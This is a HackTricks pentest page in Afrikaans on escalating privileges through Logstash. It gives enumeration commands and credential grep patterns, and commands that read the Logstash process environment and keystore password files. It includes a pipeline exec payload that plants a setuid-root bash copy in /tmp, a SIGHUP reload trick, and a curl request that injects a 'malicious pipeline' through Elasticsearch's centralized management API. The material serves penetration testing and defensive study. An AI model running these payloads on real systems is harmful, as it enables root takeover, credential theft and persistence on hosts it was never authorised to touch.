# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash word gebruik om **logs te versamel, te transformeer en te versend** deur ’n stelsel bekend as **pipelines**. Hierdie pipelines bestaan uit **input-, filter- en output**-fases. ’n Interessante aspek ontstaan wanneer Logstash op ’n gekompromitteerde masjien werk.

### Pipeline Configuration

Pipelines word in die lêer **/etc/logstash/pipelines.yml** gekonfigureer, wat die liggings van die pipeline-konfigurasies lys:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Hierdie lêer wys waar die **.conf**-lêers wat pipeline-konfigurasies bevat, geleë is. Wanneer ’n **Elasticsearch output module** gebruik word, is dit algemeen dat **pipelines** **Elasticsearch credentials** bevat, wat dikwels uitgebreide privileges het omdat Logstash data na Elasticsearch moet skryf. Wildcards in konfigurasiepaaie laat Logstash toe om alle ooreenstemmende pipelines in die aangewese directory uit te voer.

As Logstash met `-f <directory>` in plaas van `pipelines.yml` begin word, word **alle lêers binne daardie directory** in leksikografiese volgorde aaneengeskakel en as ’n enkele config geparse. Dit skep 2 offensiewe implikasies:

- ’n Gelosde lêer soos `000-input.conf` of `zzz-output.conf` kan verander hoe die finale pipeline saamgestel word
- ’n Misvormde lêer kan verhoed dat die hele pipeline laai, dus moet payloads versigtig gevalideer word voordat jy op auto-reload staatmaak

### Vinnige Enumeration op ’n Compromised Host

Op ’n host waarop Logstash geïnstalleer is, inspekteer vinnig:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Kontroleer ook of die plaaslike monitoring API bereikbaar is. By verstek luister dit op **127.0.0.1:9600**, wat gewoonlik voldoende is nadat jy toegang tot die host verkry het:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Dit gee jou gewoonlik pipeline IDs, runtime-besonderhede en bevestiging dat jou gewysigde pipeline gelaai is.

Credentials wat van Logstash herwin is, ontsluit dikwels **Elasticsearch**, dus kyk na [hierdie ander bladsy oor Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation via Writable Pipelines

Om privilege escalation te probeer, identifiseer eers die gebruiker onder wie die Logstash-service loop, gewoonlik die **logstash**-gebruiker. Maak seker dat jy aan **een** van hierdie kriteria voldoen:

- Jy het **write access** tot ’n pipeline-**.conf**-lêer **of**
- Die **/etc/logstash/pipelines.yml**-lêer gebruik ’n wildcard, en jy kan na die teikengids skryf

Daarbenewens moet **een** van hierdie voorwaardes vervul word:

- Jy kan die Logstash-service restart **of**
- Die **/etc/logstash/logstash.yml**-lêer het **config.reload.automatic: true** gestel

Gegewe ’n wildcard in die konfigurasie, laat die skep van ’n lêer wat met hierdie wildcard ooreenstem command execution toe. Byvoorbeeld:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Hier bepaal **interval** die uitvoeringsfrekwensie in sekondes. In die gegewe voorbeeld loop die **whoami**-opdrag elke 120 sekondes, met die uitvoer wat na **/tmp/output.log** gerig word.

Met **config.reload.automatic: true** in **/etc/logstash/logstash.yml** sal Logstash outomaties nuwe of gewysigde pipeline-konfigurasies opspoor en toepas sonder dat dit herbegin hoef te word. Indien daar geen wildcard is nie, kan bestaande konfigurasies steeds gewysig word, maar wees versigtig om ontwrigtings te voorkom.

### Meer Betroubare Pipeline Payloads

Die `exec` input plugin werk steeds in huidige releases en vereis óf ’n `interval` óf ’n `schedule`. Dit voer uit deur die Logstash JVM te **fork**, so indien geheue beperk is, kan jou payload misluk met **ENOMEM** in plaas daarvan om stilweg te loop.

’n Meer praktiese privilege-escalation payload is gewoonlik een wat ’n duursame artefak agterlaat:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
As jy nie herbeginregte het nie, maar wel ’n sein aan die proses kan stuur, ondersteun Logstash ook ’n herlaai wat deur **SIGHUP** geaktiveer word op Unix-agtige stelsels:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Wees bewus daarvan dat nie elke plugin herlaai-vriendelik is nie. Byvoorbeeld, die **stdin**-input voorkom outomatiese herlaai, dus moenie aanvaar dat `config.reload.automatic` altyd jou veranderinge sal oorneem nie.

### Secrets uit Logstash steel

Voordat jy net op code execution fokus, versamel die data waartoe Logstash reeds toegang het:

- Plaintext credentials is dikwels hardcoded binne `elasticsearch {}`-outputs, `http_poller`, JDBC-inputs of cloud-verwante settings
- Secure settings kan in **`/etc/logstash/logstash.keystore`** of ’n ander `path.settings`-directory wees
- Die keystore-wagwoord word dikwels deur **`LOGSTASH_KEYSTORE_PASS`** verskaf, en package-gebaseerde installs lees dit gewoonlik vanaf **`/etc/sysconfig/logstash`**
- Environment-variable expansion met `${VAR}` word tydens Logstash startup opgelos, dus is dit die moeite werd om die service se environment te inspekteer

Nuttige checks:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Dit is ook die moeite werd om na te gaan omdat **CVE-2023-46672** getoon het dat Logstash onder spesifieke omstandighede sensitiewe inligting in logs kon aanteken. Op ’n post-exploitation-host kan ou Logstash-logs en `journald`-inskrywings dus credentials openbaar, selfs al verwys die huidige konfigurasie na die keystore in plaas daarvan om secrets inline te stoor.

### Misbruik van Gesentraliseerde Pipeline Management

In sommige omgewings maak die host glad nie op plaaslike `.conf`-lêers staat nie. As **`xpack.management.enabled: true`** gekonfigureer is, kan Logstash sentraal bestuurde pipelines vanaf Elasticsearch/Kibana ophaal, en nadat hierdie modus geaktiveer is, is plaaslike pipeline-konfigurasies nie meer die bron van waarheid nie.

Dit beteken ’n ander attack path:

1. Herwin Elastic-credentials uit plaaslike Logstash-instellings, die keystore of logs
2. Verifieer of die account die **`manage_logstash_pipelines`**-cluster privilege het
3. Skep of vervang ’n sentraal bestuurde pipeline sodat die Logstash-host jou payload tydens sy volgende poll interval uitvoer

Die Elasticsearch API wat vir hierdie funksie gebruik word, is:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Dit is veral nuttig wanneer plaaslike lêers leesalleen is, maar Logstash reeds geregistreer is om pipelines op afstand te haal.

## Verwysings

- [Elastic Docs: Herlaai die konfigurasielêer](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Stel gesentraliseerde pipeline-bestuur op](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
